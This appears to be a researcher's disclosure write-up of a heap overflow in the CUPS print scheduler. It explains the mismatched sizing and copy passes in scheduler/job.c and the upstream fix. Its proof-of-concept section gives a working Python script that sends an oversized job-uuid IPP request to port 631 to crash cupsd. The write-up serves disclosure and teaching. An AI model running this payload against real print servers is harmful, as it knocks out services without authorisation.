Measuring One String, Copying Another: Heap Overflow in CUPS (CVE-2026-34979)

Prabhav Srinath | April 2026 | CVE-2026-34979 | CVSS 6.9 Medium

TL;DR

The CUPS printing scheduler (cupsd) computes the memory needed for a print job's option buffer by walking its IPP attributes and adding up their lengths in ipp_length(). But there's a catch: it explicitly skips IPP_TAG_URI attributes while calculating the allocation size! Then, when get_options() writes the data into that buffer, it makes an exception for URI attributes like job-uuid and copies them with zero bounds checks. An unauthenticated remote attacker can send an IPP print request with a 32KB job-uuid to trigger an out-of-bounds heap write, corrupting adjacent heap chunks and crashing the daemon into an instant Denial of Service.

How I Got Here

I wasn't initially hunting for printer bugs. I was auditing scheduler/job.c while tracing how IPP request attributes get flattened into the environment option string passed downstream to CUPS raster filters. This code has been around for over a decade, surviving countless audits because "someone else must have read it."

In C codebases, two-pass buffer serialization is everywhere:

  1. Pass 1: Walk the linked list of attributes and accumulate the required byte length.
  2. Allocation: Allocate the exact computed size with malloc().
  3. Pass 2: Walk the attributes again and write the characters into the buffer.

Pass 1 is effectively a contract: "I will only write what I counted here." But in cupsd, Pass 1 and Pass 2 had two completely different opinions on what a URI attribute is worth.

The Vulnerability Deep Dive

Let's inspect the two passes in scheduler/job.c side by side.

Pass One: The Sizing Pass with a Blind Spot

ipp_length() is responsible for calculating the total byte size needed for the options buffer. Notice line 486: 

// scheduler/job.c — ipp_length()
for (attr = ipp->attrs; attr != NULL; attr = attr->next)
{
  if (attr->value_tag == IPP_TAG_NOVALUE ||
      attr->value_tag == IPP_TAG_URI ||   // ← SKIPPED! ZERO bytes added for URIs!
      attr->value_tag == IPP_TAG_URISCHEME)
    continue;
  ...
}

Because job-uuid and job-authorization-uri are tagged as IPP_TAG_URI, ipp_length() contributes 0 bytes to the total buffer allocation.

Pass Two: The Broken Contract

get_options() allocates the buffer using the undersized return value from ipp_length(). Then, it walks through the attributes to copy them: 

// scheduler/job.c — get_options()
case IPP_TAG_URI:
    for (valptr = attr->values[i].string.text; *valptr;)
    {
        // If the character is a delimiter, add a backslash escape
        if (strchr(" \t\n\\'\"", *valptr))
            *optptr++ = '\\';   // ← OUT-OF-BOUNDS HEAP WRITE
        *optptr++ = *valptr++;   // ← OUT-OF-BOUNDS HEAP WRITE
    }
    *optptr = '\0';
    break;

Look closely at the loop termination condition: *valptr. It iterates until the input string's null terminator. optptr is never bounds-checked against the allocated buffer boundary!

To make matters even better (from an attacker's perspective), any whitespace, newline, or quote character triggers an extra *optptr++ = '\\', giving you a 2x amplification factor on how far past the allocated chunk you write!

Exploitation Mechanics

Per the IPP protocol specification (RFC 8011), a job-uuid attribute can be up to 32,767 bytes in length. cupsd does not validate its maximum string length before processing.

  • Attacker picks the length: You can choose whether to overflow by 10 bytes, 1,000 bytes, or 32,000 bytes.
  • Attacker controls the content: You write raw arbitrary bytes (escaped strings) across adjacent heap chunks.
  • Unauthenticated & Remote: Anyone on the local network (or anyone capable of reaching port 631) can fire an IPP print job without logging in.

Proof of Concept (Triggering DoS)

We can trigger this vulnerability by sending a minimal IPP Create-Job or Print-Job request carrying an oversized job-uuid attribute filled with whitespace: 

# Python snippet constructing an IPP request with a long job-uuid
import socket

ipp_req = (
    b"\x02\x00"                  # IPP version 2.0
    b"\x00\x02"                  # Print-Job operation
    b"\x00\x00\x00\x01"          # Request ID
    b"\x01"                      # Operation attributes tag
    b"\x45"                      # IPP_TAG_URI tag
    b"\x00\x08job-uuid"          # Attribute name
    b"\x40\x00"                  # 16,384 byte string length
    + b" " * 16384               # Spaces trigger 2x '\\ ' heap write amplification!
    + b"\x03"                    # End of attributes tag
)

s = socket.socket()
s.connect(("192.168.1.50", 631))
http_post = (
    f"POST /printers/default HTTP/1.1\r\n"
    f"Host: 192.168.1.50:631\r\n"
    f"Content-Type: application/ipp\r\n"
    f"Content-Length: {len(ipp_req)}\r\n\r\n"
).encode() + ipp_req

s.sendall(http_post)
# Crash: cupsd receives SIGSEGV from heap corruption

The Fix

The OpenPrinting maintainers resolved this in CUPS 2.4.17+ by updating ipp_length() to properly account for URI attribute lengths during the allocation sizing pass and ensuring strict bounds checks are enforced when copying attributes in get_options().

Takeaways

Whenever an application uses a multi-pass serialization pipeline, the sizing pass and the writing pass must share the exact same tag evaluation logic. In C, whenever a loop writes to a pointer, it must check against the upper bound on every single write, not just rely on the input string terminating.
